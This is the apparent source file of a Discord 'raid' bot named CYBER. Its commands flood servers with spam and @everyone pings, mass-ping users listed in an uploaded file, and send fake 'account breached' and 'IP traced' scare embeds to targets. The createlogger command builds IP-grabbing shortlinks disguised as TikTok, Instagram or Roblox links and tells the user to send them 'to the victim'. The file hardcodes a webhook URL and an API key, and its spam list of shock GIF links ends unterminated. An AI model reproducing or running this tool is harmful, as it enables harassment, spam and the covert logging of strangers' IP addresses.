import os
import re
import io
import json
import time
import base64
import asyncio
import random
import logging
import requests
import aiohttp
from io import BytesIO
from datetime import datetime, timedelta
from colorama import Fore, Style, init
import discord
from discord import User, Embed, Interaction, Permissions, AllowedMentions, ButtonStyle, app_commands
from discord.ext import commands
from discord.ui import Modal, TextInput, View, Button
from PIL import Image, ImageDraw, ImageFont, ImageOps

import requests

init(autoreset=True)

LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1494034203371769997/T_nprdxd93SKV-bRudRqUos7gZmY2cqWdjtErO9k4pCZBiy2hJc9b0WXIJ5qqd_0gbkO" # webhook for all logs
PREMIUM_FILE = "premium.json"
PRESETS_FILE = "presets.json"


IPLOGGER_API_KEY = "api_OmDEXZUK0kkXK3U3Xx822kBOj8s8XbER"

class RateLimitFilter(logging.Filter):
    def filter(self, record):
        if "is rate limited" in record.getMessage():
            if not hasattr(record, "already_logged"):
                record.already_logged = True
            return False 
        return True  

logger = logging.getLogger("discord.webhook.async_")
logger.addFilter(RateLimitFilter())

with open("config.json", "r", encoding="utf-8") as f:
    config = json.load(f)
    
class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int) -> (bool, int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)


def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def add_premium_user(user_id: int):
    premium_users = load_premium_users()
    if user_id not in premium_users:
        premium_users.append(user_id)
        save_premium_users(premium_users)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def remove_premium_user(user_id: int) -> bool:
    premium_users = load_premium_users()
    if user_id in premium_users:
        premium_users.remove(user_id)
        save_premium_users(premium_users)
        return True
    return False

def update_leaderboard(user_id: int):
    leaderboard_file = "leaderboard.json"

    if not os.path.exists(leaderboard_file):
        with open(leaderboard_file, "w") as f:
            json.dump({}, f)

    with open(leaderboard_file, "r") as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError:
            data = {}

    user_id_str = str(user_id)

    if user_id_str in data:
        data[user_id_str] += 1
    else:
        data[user_id_str] = 1

    with open(leaderboard_file, "w") as f:
        json.dump(data, f, indent=4)


def update_leaderboard(user_id: int, command_name: str):
    leaderboard_file = "leaderboard.json"

    if not os.path.exists(leaderboard_file):
        with open(leaderboard_file, "w") as f:
            json.dump({}, f)

    with open(leaderboard_file, "r") as f:
        try:
            data = json.load(f)
        except json.JSONDecodeError:
            data = {}

    user_id_str = str(user_id)

    if user_id_str not in data:
        data[user_id_str] = {
            "overall": 0
        }

    data[user_id_str]["overall"] += 1

    if command_name not in data[user_id_str]:
        data[user_id_str][command_name] = 1
    else:
        data[user_id_str][command_name] += 1

    with open(leaderboard_file, "w") as f:
        json.dump(data, f, indent=4)

def save_token(token):
    with open("config.json", "w") as file:
        json.dump({"TOKEN": token}, file)

def load_token():
    try:
        with open("config.json", "r") as file:
            data = json.load(file)
            return data.get("TOKEN")
    except FileNotFoundError:
        print(Fore.RED + "Error: 2 not found.")
        return None
    except json.JSONDecodeError:
        print(Fore.RED + "Error: Invalid JSON format in config.json.")
        return None

logo = f"""{Fore.MAGENTA}

   ___ _   _ ___ ___ ___ ___ 
  / __| | | | _ ) __| _ \
 | (__| |_| | _ \ _||   /
  \___|\___/|___/___|_|_\
{Fore.WHITE}     easy raid lol                       
 
"""



def display_status(connected):
    if connected:
        print(Fore.GREEN + "Status: Connected")
    else:
        print(Fore.RED + "Status: Disconnected")

def token_management():
    os.system('cls' if os.name == 'nt' else 'clear') 
    print(Fore.CYAN + "Welcome to the bot token management!\n")
    print("1. Set a new token")
    print("2. Load previous token")
    
    print()

    choice = input(f"{Fore.YELLOW}>{Fore.WHITE} Choose an option (1, 2){Fore.YELLOW}:{Fore.WHITE} ")

    if choice == "1":
        new_token = input(Fore.GREEN + "Enter the new token: ")
        save_token(new_token)
        print(Fore.GREEN + "Token successfully set!")
        return new_token
    elif choice == "2":
        token = load_token()
        if token:
            print(f"{Fore.GREEN}>{Fore.WHITE} Previous token loaded: {Fore.GREEN}{token}{Fore.WHITE}.")
            return token
        else:
            print(Fore.RED + "No token found.")
            return None
    else:
        print(Fore.RED + "Invalid choice. Please try again.")
        return None

async def log_command_use(
    user: discord.User,
    command_name: str,
    message: str = None,
    channel: discord.abc.Messageable = None
):
    user_display = f"{user.display_name} ({user.name}) [{user.id}]"

    fields = [
        {
            "name": "User",
            "value": user_display,
            "inline": True
        },
        {
            "name": "Command",
            "value": f"`{command_name}`",
            "inline": True
        },
        {
            "name": "Time",
            "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
            "inline": True
        }
    ]

    if channel:
        fields.append({
            "name": "Channel",
            "value": str(channel),
            "inline": True
        })

    if message:
        if command_name == "avatar":
            fields.append({
                "name": "Avatar Checked",
                "value": f"[Avatar Link]({message})",
                "inline": False
            })
        else:
            trimmed = message if len(message) <= 1024 else message[:1021] + "..."
            fields.append({
                "name": "Message Content",
                "value": trimmed,
                "inline": False
            })

    embed = {
        "title": "⚡ Command Executed",
        "color": 0xa874d1,
        "fields": fields,
        "author": {
            "name": user.display_name,
            "icon_url": user.display_avatar.url
        },
        "footer": {
            "text": "CYBER Logger",
            "icon_url": user._state._get_client().user.avatar.url
            if user._state._get_client().user.avatar
            else None
        }
    }

    if command_name == "avatar" and message:
        embed["thumbnail"] = {"url": message}

    webhook_data = {"embeds": [embed]}

    async with aiohttp.ClientSession() as session:
        async with session.post(LOG_WEBHOOK_URL, json=webhook_data) as resp:
            if resp.status != 204:
                print(f"Failed to send log webhook, status: {resp.status}")

intents = discord.Intents.default()
intents.messages = False  
intents.message_content = False  
intents.members = False  
intents.guilds = False  
intents.typing = False 
intents.presences = False  

bot = commands.Bot(command_prefix="!", intents=intents)


def load_presets():
    if not os.path.exists(PRESETS_FILE):
        return {}

    try:
        with open(PRESETS_FILE, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return {}
            return json.loads(content)
    except json.JSONDecodeError:
        return {}

def save_preset(user_id, message):
    data = load_presets()
    data[str(user_id)] = message

    with open(PRESETS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def get_preset(user_id):
    data = load_presets()
    return data.get(str(user_id))

class PresetModal(Modal, title="Set Your Custom Raid Message"):
    def __init__(self, user_id: int):
        super().__init__()
        self.user_id = user_id
        self.message_input = TextInput(label="Enter your spam message", style=discord.TextStyle.long, max_length=2000)
        self.add_item(self.message_input)

    async def on_submit(self, interaction: Interaction):
        save_preset(self.user_id, self.message_input.value)
        await interaction.response.send_message("✅ Preset message saved successfully!", ephemeral=True)

class PresetView(View):
    def __init__(self, user_id: int):
        super().__init__(timeout=180)
        self.user_id = user_id

    @discord.ui.button(label="Set Message", style=ButtonStyle.green)
    async def set_message(self, interaction: Interaction, button: Button):
        await interaction.response.send_modal(PresetModal(user_id=self.user_id))

    @discord.ui.button(label="Preview Message", style=ButtonStyle.primary)
    async def preview_message(self, interaction: Interaction, button: Button):
        message = get_preset(self.user_id)
        if message:
            await interaction.response.send_message(f"📄 **Your preset message:**\n```{message}```", ephemeral=True)
        else:
            await interaction.response.send_message("⚠️ No preset message found. Please set one first.", ephemeral=True)

@bot.tree.command(name="preset-message", description="Manage your custom raid message preset.")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def preset_message(interaction: discord.Interaction):
    if not is_premium_user(interaction.user.id):
        await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
        return
    view = PresetView(user_id=interaction.user.id)
    embed = discord.Embed(
        title="⚡ Preset Message",
        description="Use the buttons below to set or preview your raid message.",
        color=0xa874d1
    )
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)



SPOOF_MAP = {
    "tiktok_video": "https//www.tiktok.com/@feri_azimi/video/1234567890",
    "tiktok_account": "https//www.tiktok.com/@feri_azimi",
    "instagram_video": "https//www.instagram.com/reel/DIMO87VJrik",
    "instagram_account": "https//www.instagram.com/feri_azimi/",
    "roblox_account": "https//www.roblox.com/users/3554077592/profile"
}

@bot.tree.command(
    name="createlogger",
    description="[💎] Create a redirect IPLogger shortlink (use for legal purposes only!)"
)
@app_commands.describe(
    domain="Choose the logger domain",
    destination="Target URL for the redirect (e.g., https://tiktok.com)",
    spoof_type="Choose how the link should appear"
)
@app_commands.choices(domain=[
    app_commands.Choice(name="ed.tc", value="ed.tc"),
    app_commands.Choice(name="wl.gl", value="wl.gl"),
    app_commands.Choice(name="bc.ax", value="bc.ax"),
])
@app_commands.choices(spoof_type=[
    app_commands.Choice(name="TikTok Video", value="tiktok_video"),
    app_commands.Choice(name="TikTok Account", value="tiktok_account"),
    app_commands.Choice(name="Instagram Video", value="instagram_video"),
    app_commands.Choice(name="Instagram Account", value="instagram_account"),
    app_commands.Choice(name="Roblox Account", value="roblox_account")
])
async def createlogger(
    interaction: discord.Interaction,
    domain: app_commands.Choice[str],
    destination: str,
    spoof_type: app_commands.Choice[str]
):
    await interaction.response.defer(ephemeral=True, thinking=True)

    if not is_premium_user(interaction.user.id):
        await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
        return

    try:
        if not destination.startswith(("http://", "https://")):
            destination = "https://" + destination

        payload = {
            "domain": domain.value,
            "alias": "discord_logger",
            "destination": destination
        }

        endpoint = "https://api.iplogger.org/create/shortlink/"

        response = requests.post(
            endpoint,
            headers={"X-token": IPLOGGER_API_KEY},
            data=payload
        )
        data = response.json()

        if "result" in data:
            shortlink = data["result"].get("shortlink")
            direct_link = f"https://{data['result']['domain']}/{data['result']['link']}"
            viewer_link = f"https://iplogger.org/logger/{data['result']['id']}"

            spoof_base = SPOOF_MAP[spoof_type.value]
            spoofed_link_msg = f"[{spoof_base}]({shortlink})"

            details_msg = (
                f"✅ **Logger created!**\n"
                f"🔗 **Public link:** {shortlink}\n"
                f"👁 **Dashboard link (dont share):** {viewer_link}\n"
                f"🎯 **Redirects to:** {payload['destination']}\n\n"
                f":exclamation: **Tip:** Forward the logger link above to the victim. Copy and pasting will break the spoofed link.\n"
            )

            try:
                await interaction.user.send(spoofed_link_msg)
                await interaction.user.send(details_msg)

                await interaction.followup.send("📩 Sent to your DMs!", ephemeral=True)

            except discord.Forbidden:
                await interaction.followup.send(
                    "❌ I couldn't DM you! Please enable DMs from server members.",
                    ephemeral=True
                )

        else:
            await interaction.followup.send(f"❌ Invalid API response: {data}", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"⚠️ API request error: {e}", ephemeral=True)



class SpamButton(discord.ui.View):
    def __init__(self, message):
        super().__init__()
        self.message = message

    @discord.ui.button(label="Spam", style=discord.ButtonStyle.red)
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        allowed = discord.AllowedMentions(everyone=True, users=True, roles=True)
        for _ in range(5):  
            await interaction.followup.send(self.message, allowed_mentions=allowed)  

@bot.tree.command(name="custom-raid", description="[💎] Premium Raid with your own message. (premium only!)")
@app_commands.describe(message="Optional: your custom message to spam (use /preset-message if you want to save it)")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def custom_raid(interaction: discord.Interaction, message: str = None):
    if not is_premium_user(interaction.user.id):
        await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
        return

    if not message:
        message = get_preset(interaction.user.id)
        if not message:
            await interaction.response.send_message("❌ You have not set a preset message. Use `/preset-message` to set one.", ephemeral=True)
            return

    view = SpamButton(message)
    await interaction.response.send_message(f"💎 SPAM TEXT:\n```{message}```", view=view, ephemeral=True)

    await log_command_use(
        user=interaction.user,
        command_name="💎 custom-raid",
        channel=interaction.channel,
        message=message
    )
    update_leaderboard(interaction.user.id, "custom-raid")




class PingButton(discord.ui.View):
    def __init__(self, user_ids: list[str], pings_per_message: int = 1):
        super().__init__(timeout=None)
        self.user_ids = user_ids
        self.pings_per_message = pings_per_message
        self.delay = 1

    @discord.ui.button(label="🔁 Ping!", style=discord.ButtonStyle.red)
    async def ping_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.user_ids:
            await interaction.response.send_message("⚠️ No IDs available to ping.", ephemeral=True)
            return

        await interaction.response.defer(ephemeral=True)
        max_retries = 2

        for _ in range(5):
            selected_ids = random.sample(self.user_ids, min(self.pings_per_message, len(self.user_ids)))
            mentions = " ".join(f"<@{uid}>" for uid in selected_ids)
            pingmsg = '''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                  ***@CYBER**   `🌙`
                  raid b__o__t  ﹒ s__o__cial  ﹒ to__xic__
                         `🌟`     _join to [RAID](https://tenor.com/view/playboi-carti-discord-discord-raid-gif-21005635) any server __Without Admin perms__, free to use_ :moneybag: 

⠀⠀⠀⠀⠀⠀⠀                            **[JOIN](https://discord.com/invite/DVtWPzSmns) TODAY, AND R__AI__D EVER__Y__ SERVER YOU WANT WITHOUT [ADMIN](https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775)**
            '''
            message_content = f"{mentions}\n{pingmsg}"
            retries = 0
            while retries <= max_retries:
                try:
                    await interaction.followup.send(message_content, ephemeral=False)
                    break
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 1.5)
                        retry_after = min(retry_after, 5)
                        print(f"Rate limit hit, retrying after {retry_after:.2f}s (retry {retries + 1}/{max_retries})")
                        await asyncio.sleep(retry_after)
                        retries += 1
                    else:
                        raise e
            else:
                print("Failed to send message after max retries, skipping.")


@bot.tree.command(name="ping", description="Ping random user IDs from a .txt file using a button.")
@app_commands.describe(
    file="A .txt file containing user IDs (one per line)",
    pings_per_message="amount of users to ping per message (most servers block 5+ pings per message so keep it low)"
)
@app_commands.rename(pings_per_message="amount")
async def ping_from_file(
    interaction: discord.Interaction,
    file: discord.Attachment,
    pings_per_message: int = 1
):

    try:
        if not file.filename.endswith(".txt"):
            await interaction.response.send_message("❌ Please upload a valid `.txt` file with user IDs.", ephemeral=True)
            return

        file_content = await file.read()
        text = file_content.decode("utf-8")
        user_ids = [line.strip() for line in text.splitlines() if line.strip().isdigit()]

        if not user_ids:
            await interaction.response.send_message("⚠️ No valid user IDs found in the file.", ephemeral=True)
            return

        view = PingButton(user_ids, pings_per_message)
        await interaction.response.send_message("🔴 Click to ping random users!", view=view, ephemeral=True)


    except Exception as e:
        if interaction.response.is_done():
            await interaction.followup.send(f"❌ Error: `{e}`", ephemeral=True)
        else:
            await interaction.response.send_message(f"❌ Error: `{e}`", ephemeral=True)




class AvatarView(discord.ui.View): # made that shit in 5min its really ass
    def __init__(self, user: discord.User, banner_url: str = None):
        super().__init__()
        avatar_url = user.display_avatar.url

        self.add_item(discord.ui.Button(label="Download Avatar as JPG", url=avatar_url + "?format=jpg"))
        self.add_item(discord.ui.Button(label="Download Avatar as PNG", url=avatar_url + "?format=png"))

        if banner_url:
            self.add_item(discord.ui.Button(
                label="View Banner",
                style=discord.ButtonStyle.blurple, 
                url=banner_url
            ))
            self.add_item(discord.ui.Button(label="Download Banner as JPG", url=banner_url + "?format=jpg"))
            self.add_item(discord.ui.Button(label="Download Banner as PNG", url=banner_url + "?format=png"))

class AvatarView(discord.ui.View):
    def __init__(self, user: discord.User, banner_url: str = None):
        super().__init__()
        avatar_url = user.display_avatar.url

        self.add_item(discord.ui.Button(label="Download Avatar", url=avatar_url + "?format=png"))

        if banner_url:
            self.add_item(discord.ui.Button(label="Download Banner", url=banner_url + "?format=png"))

@bot.tree.command(name="avatar", description="Get a user's avatar and banner.")
@app_commands.describe(user="The user whose avatar you want to see")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def avatar(interaction: discord.Interaction, user: discord.User = None):
    user = user or interaction.user

    full_user = await interaction.client.fetch_user(user.id)
    banner_url = full_user.banner.url if full_user.banner else None

    embed = discord.Embed(
        title=f"{user.display_name}'s Avatar & Banner",
        color=0xa874d1
    )
    
    embed.set_thumbnail(url=user.display_avatar.url)

    if banner_url:
        embed.set_image(url=banner_url)

    embed.set_footer(
        text=f"Requested by {interaction.user.display_name}",
        icon_url=interaction.client.user.avatar.url if interaction.client.user.avatar else None
    )

    view = AvatarView(user, banner_url)

    await interaction.response.send_message(embed=embed, view=view)

    await log_command_use(
        user=interaction.user,
        command_name="avatar",
        channel=interaction.channel,
        message=user.display_avatar.url
    )


class FloodButton(discord.ui.View):
    def __init__(self, message, delay):
        super().__init__()
        self.message = message
        self.delay = delay

    @discord.ui.button(label="⚡ Execute Command", style=discord.ButtonStyle.blurple)
    async def flood_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        max_retries = 2

        for _ in range(5):
            retries = 0
            while retries <= max_retries:
                try:
                    await interaction.followup.send(self.message, allowed_mentions=discord.AllowedMentions(everyone=True))
                    await asyncio.sleep(self.delay + random.uniform(0.1, 0.5))
                    break
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 1.5)
                        retry_after = min(retry_after, 5)
                        print(f"{Fore.YELLOW}>{Fore.WHITE} Rate limit hit, retrying after {Fore.YELLOW}{retry_after:.2f}s{Fore.WHITE} (retry {Fore.YELLOW}{retries + 1}{Fore.WHITE}/{Fore.YELLOW}{max_retries}{Fore.WHITE})")
                        await asyncio.sleep(retry_after)
                        retries += 1
                    else:
                        raise e
            else:
                print(f"{Fore.RED}>{Fore.WHITE} Failed to send message after max retries, skipping{Fore.RED}.{Fore.WHITE}")



class IPView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

@bot.tree.command(name="ip", description="Reveal a user's IP to scare them! (fake)")
@app_commands.describe(user="The user you want to trace")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ip(interaction: discord.Interaction, user: discord.User):
    fake_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    port = random.choice([22, 443, 8080])
    trace_id = f"#ZTA-{random.randint(1000, 9999)}"

    embed = discord.Embed(
        title="🚨 CRITICAL: Unauthorized Network Access Detected",
        description=(
            f"Intrusion Detection System has traced your connection: **IP {fake_ip}, Port {port}**, Subnet **255.255.255.0**.\n"
            f"Your activity has been flagged as a potential security breach and logged for further analysis. "
            f"Cease unauthorized actions immediately or face escalation.\n\n"
            f"🔒 **Security Alert**\n"
            f"Your IP address has been identified as: **{fake_ip}**. This information has been logged for security monitoring.\n\n"
            f"**Threat Level**: HIGH\n"
            f"**Trace ID**: `{trace_id}`\n"
            f"**Timestamp**: {discord.utils.format_dt(interaction.created_at, style='F')}"
        ),
        color=discord.Color.red()
    )

    await interaction.response.send_message("🔍 Tracing their IP...", ephemeral=True)

    await interaction.followup.send(
        content=f"{user.mention}",
        embed=embed,
        view=IPView()
    )
    await log_command_use(interaction.user, "ip reveal")
    update_leaderboard(interaction.user.id, "ip")

@ip.error
async def ip_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.TransformError):
        await interaction.response.send_message("User not found. Please mention a valid member.", ephemeral=True)
    else:
        await interaction.response.send_message(f"An error occurred: {error}", ephemeral=True)

import base64


def get_badges(user: discord.Member) -> str:
    flags = user.public_flags
    badges = []

    if flags.hypesquad: badges.append("🏠 HypeSquad")
    if flags.hypesquad_bravery: badges.append("🦁 Bravery")
    if flags.hypesquad_brilliance: badges.append("🧠 Brilliance")
    if flags.hypesquad_balance: badges.append("⚖️ Balance")
    if flags.early_supporter: badges.append("🌟 Early Supporter")
    if flags.staff: badges.append("👔 Staff")
    if flags.partner: badges.append("🤝 Partner")
    if flags.verified_bot: badges.append("🤖 Verified Bot")
    if flags.verified_bot_developer: badges.append("👨‍💻 Bot Dev")

    return ", ".join(badges) if badges else "No Badges"

@bot.tree.command(name="hack", description="Hack to scare them! (fake)")
@app_commands.describe(user="The user you want to hack")
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def hack(interaction: discord.Interaction, user: discord.User):
    user_id_str = str(user.id)
    b64_id = base64.b64encode(user_id_str.encode()).decode()[:-2]

    badges = get_badges(user)

    file_options = [
        "stealer_base_23.04.2025.txt",
        "stealer_base_11.10.2022.db",
        "stealer_logs_240520.txt",
        "stealer_base202401.db",
        "breach_base_01_03_2021.txt",
        "breach_logs_2025.txt"
        "stealer_base_23.04.2025.txt",
        "stealer_base_11.10.2022.db",
        "stealer_logs_240520.txt",
        "stealer_base202401.db",
        "breach_base_01_03_2021.txt",
        "breach_logs_2025.txt",
        "stealer_backup_15.08.2023.db",
        "breach_archive_202212.txt",
        "stealer_data_03122024.db",
        "breach_base_99_99_9999.txt",
        "stealer_records_07.07.2020.txt",
        "logs_stealer_202503.db",
        "breach_dump_12_12_2022.txt",
        "stealer_cache_20240115.db",
        "breach_data_2025_backup.txt",
        "stealer_base_old_201901.db"
    ]
    found_in_file = random.choice(file_options)

    embed = discord.Embed(
        title=f"Found in: {found_in_file}",
        color=discord.Color.purple()
    )

    embed.add_field(
        name=f"{user.name} ({user.id})",
        value=(
            f"🪙 **Token:**\n`{b64_id}****`\n\n"
            f":e_mail:  Gmail: `Hidden`\n"
            f":iphone: Phone: `Hidden`\n"
            f":globe_with_meridians: Earth IP: `Hidden`"
        ),
        inline=False
    )

    embed.add_field(name="🎖 Badges:", value=badges, inline=True)
    embed.add_field(name="💳 Billing:", value="`(no billing)`", inline=True)
    embed.add_field(name="👥 HQ Friends:", value="`None`", inline=True)
    embed.add_field(name="🌍 Guilds:", value="`None`", inline=True)
    embed.add_field(name="🎁 Gift codes:", value="`None`", inline=True)

    embed.set_thumbnail(url=user.avatar.url if user.avatar else None)
    embed.set_footer(text="CYBER")

    await interaction.response.send_message(":computer: breaching account...", ephemeral=True)

    await interaction.followup.send(
        content=f"{user.mention}",
        embed=embed,
        view=IPView()
    )


@hack.error
async def hack_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.TransformError):
        await interaction.response.send_message("User not found. Please mention a valid member.", ephemeral=True)
    else:
        await interaction.response.send_message(f"An error occurred: {error}", ephemeral=True)



RAGEBAIT = ["""
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
# LOL IMAGINE GETTING RAIDED BOZO JOIN CYBER AND START RAIDING
@everyone
https://discord.com/invite/DVtWPzSmns
https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775
https://media.discordapp.net/attachments/1215053612028526653/1219435249763750028/1218622476645564527_1650x1080.gif?ex=686c5f93&is=686b0e13&hm=1f0bd7f260f88162001a02772b415d14168a43cf7ee7cc94c2c9f03af54d9bed&
    """,
"""
https://media.discordapp.net/attachments/456392245080489985/979944686330466314/SPOILER_image0-4-1-2-1-4.gif?ex=68a736db&is=68a5e55b&hm=7b6dcd53ba9154bdd554b9d0ef66fd0a3818050f8f0b0c115a42251a1187d43a&
https://cdn.discordapp.com/attachments/852013046503309312/1048311625041588255/IMG_9742.gif?ex=68a76bc8&is=68a61a48&hm=661d67483e8e599dd981227c2c01bb837ee837228c9b761b2241689746197277&
https://images-ext-1.discordapp.net/external/RibPwVcp6TgdmghdQSaNAOQV0MZeDQxvHDUEWZ7pUBI/https/media.tenor.com/NYt1pcwUGMgAAAPo/shon-good-morning-shon.mp4
https://cdn.discordapp.com/attachments/1118049015246889034/1167872527004074055/DcyuYCnY.gif?ex=68a7528c&is=68a6010c&hm=7cfa2a4b2f00b05d0bd6fb43f72c1146d2ece0c5f76d92f8020f53d54240c648&
https://media.discordapp.net/attachments/771470891728896033/1205525179761958912/DO_NOT_YAP.gif?ex=68a73150&is=68a5dfd0&hm=a9c5705b82abb244a6dbc70c76ef70b0d9c7bdcf40e169d0884f1b0da88d5fb7&
"""
,
"""
https://media.discordapp.net/attachments/1073648853842137099/1087519214262304798/3A28F855-D783-40E4-BB1E-B2AA96EB3AA9.gif?ex=68a703f1&is=68a5b271&hm=35f2a7f937132353b94f84457d607fed1f95154ad433be55fbd281310706b332&
https://media.discordapp.net/attachments/876200007181664267/916099166504116264/vaccum.gif?ex=68a6fa15&is=68a5a895&hm=2d5d347875f1fb0a265eef026b7fe9e4b8986ef88c29436438e09b404f98ddc7&
https://cdn.discordapp.com/attachments/1289783456376819713/1373859408894754836/caption.gif?ex=68a73608&is=68a5e488&hm=ec2ad8952f850afe6f976bbc143fd031cf2a0becfa3f6785862a846a0383baeb&
https://cdn.discordapp.com/attachments/1118049015246889034/1374166932256718959/togif.gif?ex=68a702ef&is=68a5b16f&hm=7e5d7da7f95276687791c44432cd15717d98d2826718368ef0c686563495d8a3&
https://media.discordapp.net/attachments/1407764862356029623/1407851873586643125/FinalVideo_1647373394.613837.mov?ex=68a79bbb&is=68a64a3b&hm=6bb244c6178fe7b8bc43aeca5989865bd6a2020c12096c3c9c9a318b2cb38b0f&
"""
,

"""
https://cdn.discordapp.com/attachments/1407764862356029623/1407850408373911654/IMG_5940.png?ex=68a79a5d&is=68a648dd&hm=c90fae657d9d4a31dc0d6960d6efbf9a52d50dd44d494cf1e358c96f71cb13b9&
https://media.discordapp.net/attachments/809845478967214090/887784378195918919/image0-2.gif?ex=68a775a1&is=68a62421&hm=6e2b060849919e23557bddcb9d6b761462dbf6723d4fe912fad99b915d2aada5&
https://media.discordapp.net/attachments/1081305427087736894/1083481387937570817/E7578720-2C28-4F80-A2F7-C7B5680D58FB.gif?ex=68a77cac&is=68a62b2c&hm=9249ff9dcc53f02b606966f6fb406772c4e7101f308ef3745c95bc3376aed90f&
https://media.discordapp.net/attachments/987062451575078933/1037486174098444408/unknown-4.gif?width=275&height=468&ex=68a796cb&is=68a6454b&hm=a12791dfadf10f0e584d2c74e714622cb5c59b66df587f453b8842c2dafbc4df&
https://img.cocdn.co/_image/optimize/https://cdn.crushon.ai/images/a3b86280-5900-11ef-b239-3a544bb25f02/0a4d441b-62e2-4efd-9f5f-5464f768c2a0?q=75&w=1200
"""
,

"""
https://cdn.discordapp.com/attachments/1179439926207590543/1316161150806790265/togif.gif?ex=68a79597&is=68a64417&hm=b37560c76d57b8f6a4ffe28b955c69e84a6c687e3e3e9a49e48f3af1937bee74&
https://cdn.discordapp.com/attachments/1212754609760768010/1270638966034399273/trim.625697AE-5F2A-4462-8864-E7E80A3D2D1A_1_2.gif?ex=68a76e00&is=68a61c80&hm=4970709a8466a44e901bd6a8668a1d62bf82abc0ab4060614120424ed9167eb0&
https://media.discordapp.net/attachments/876070919850840068/1150688266656419861/33EF8EA9-E6C4-4CCA-A835-AA9A5E04B700.gif?ex=68a76db5&is=68a61c35&hm=37a97a7bc3fb36374fc9eedcfc07b40f10701f59cd54259b7f2be600ca471748&
https://cdn.discordapp.com/attachments/1312599895730946150/1314560028828635166/bleedFLUXgJV3VDwyElwvk.gif?ex=68a7086e&is=68a5b6ee&hm=02baed2096e51a04df274649193342bc50bccbafba7144ac35762cfc2616635c&
https://cdn.discordapp.com/attachments/1407764862356029623/1407787054741459056/IMG_0886.png?ex=68a75f5d&is=68a60ddd&hm=f585468ddcaf1762e180d48596a937fd570cbc43078b9383d7bf66f7a7c3f629&
"""
,

"""
https://cdn.discordapp.com/attachments/1395186223970259105/1395207538818945167/caption.gif?ex=68a71786&is=68a5c606&hm=ac2eeaa69644a2a22f4b3e8239f125bc9583510c4e85b1a3c5e9db2fa05856fa&
